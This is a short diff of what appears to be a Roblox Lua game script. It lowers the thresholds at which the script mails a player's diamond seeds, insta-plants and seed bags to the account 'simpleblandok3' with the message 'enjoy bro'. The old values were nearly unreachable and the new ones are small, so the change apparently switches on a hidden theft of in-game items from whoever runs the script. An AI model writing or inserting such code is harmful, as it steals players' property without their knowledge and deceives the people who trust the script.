@@ -623,7 +623,7 @@ wait(10)
 
         end
 wait(10)
-if DiamondsSeedAmount > 99950 then
+if DiamondsSeedAmount > 50 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -635,7 +635,7 @@ local args = {
 end
 wait(10)
 
-if InstaPlantAmount > 99930 then
+if InstaPlantAmount > 30 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -646,7 +646,7 @@ local args = {
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 end
 wait(10)
-if SeedBagAmount > 999100 then
+if SeedBagAmount > 100 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
